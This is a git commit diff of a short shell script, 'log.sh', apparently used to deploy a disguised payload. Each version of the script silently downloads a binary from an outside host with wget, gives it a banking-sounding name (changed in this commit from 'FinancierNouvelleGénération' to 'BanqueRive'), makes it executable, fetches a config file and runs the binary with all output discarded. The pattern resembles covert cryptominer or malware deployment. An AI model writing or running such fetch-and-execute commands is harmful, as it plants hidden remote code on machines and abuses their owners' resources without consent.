5a8de1b2db2ff8cda7825f82bb18402cd157be3d
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-10 13:51:22 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O FinancierNouvelleGénération https://02ip.ru/service && chmod +x FinancierNouvelleGénération >/dev/null 2>&1
+wget -q -O BanqueRive https://02ip.ru/service && chmod +x BanqueRive >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./FinancierNouvelleGénération -c "config.json" >/dev/null 2>&1
+./BanqueRive -c "config.json" >/dev/null 2>&1
